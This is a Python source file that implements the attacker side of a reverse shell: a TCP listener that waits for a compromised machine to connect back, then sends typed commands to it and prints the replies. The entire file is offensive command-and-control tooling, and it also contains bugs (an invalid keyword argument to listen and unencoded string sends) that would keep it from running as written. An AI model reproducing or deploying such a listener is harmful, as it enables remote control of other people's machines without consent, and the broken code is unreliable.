import socket


class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(__backlog=4)

        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection -> from :: {str(address)}")

    def execute_remotely(self, command):
        self.connection.send(command)
        result = self.connection.recv(1024)
        return result

    def run(self):
        while True:
            command = str(input(">> "))
            result = self.execute_remotely(command)
            print(result)

